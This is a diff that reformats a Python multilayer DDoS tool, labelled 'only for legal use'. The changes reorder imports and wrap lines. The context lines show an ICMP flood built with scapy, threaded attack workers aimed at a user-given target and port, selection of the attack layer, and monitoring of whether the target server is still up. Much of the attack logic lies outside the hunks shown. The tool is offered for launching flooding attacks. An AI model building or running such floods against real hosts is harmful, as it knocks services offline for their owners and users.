@@ -1,14 +1,16 @@
 import argparse
-import threading
 import random
 import socket
 import ssl
-import requests
+import threading
 import time
-from scapy.all import IP, TCP, UDP, ICMP, send
+
+import requests
+from scapy.all import IP, TCP, ICMP, send
 
 server_status_global = "Unbekannt"
 server_status_global_array = []
+
 
 def attack_layer3_icmp(target_ip, progress):
     pkt = IP(dst=target_ip) / ICMP()
@@ -90,9 +92,7 @@ def display_status(progress, start_time, duration, monitor_layer7, target_ip):
         else:
             rem_str = "unendlich"
 
-
         server_status = f"Server: {server_status_global}"
-
 
         output = (
             f"\r[Dauer: {time_str} | Verbleibend: {rem_str}] "
@@ -121,6 +121,7 @@ def print_log(progress, start_time, duration):
     for i in server_status_global_array:
         print(f"{i['time']}: {i['status']}")
 
+
 def check_server_status_periodically(target_ip, stop_event, start_time):
     global server_status_global
     global server_status_global_array
@@ -146,7 +147,8 @@ def check_server_status_periodically(target_ip, stop_event, start_time):
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Multilayer DDoS Test Tool (only for legal use!) | Please run with sudo to use layer 4")
+    parser = argparse.ArgumentParser(
+        description="Multilayer DDoS Test Tool (only for legal use!) | Please run with sudo to use layer 4")
     parser.add_argument("target", help="Ziel-IP oder Hostname")
     parser.add_argument("--port", type=int, default=80, help="Zielport (Standard: 80)")
     parser.add_argument("--layer", required=True, help="Layer angeben: 3,4,6,7 oder 'all'")
@@ -172,13 +174,16 @@ if __name__ == "__main__":
 
     try:
         for _ in range(args.threads):
-            t = threading.Thread(target=run_attack, args=(layers, args.target, args.port, progress, start_time, args.duration))
+            t = threading.Thread(target=run_attack,
+                                 args=(layers, args.target, args.port, progress, start_time, args.duration))
             t.daemon = True
             t.start()
 
-        display = threading.Thread(target=display_status, args=(progress, start_time, args.duration, "7" in layers, args.target))
+        display = threading.Thread(target=display_status,
+                                   args=(progress, start_time, args.duration, "7" in layers, args.target))
         stop_event = threading.Event()
-        server_monitor = threading.Thread(target=check_server_status_periodically, args=(args.target, stop_event, start_time))
+        server_monitor = threading.Thread(target=check_server_status_periodically,
+                                          args=(args.target, stop_event, start_time))
         server_monitor.daemon = True
         server_monitor.start()
         display.start()
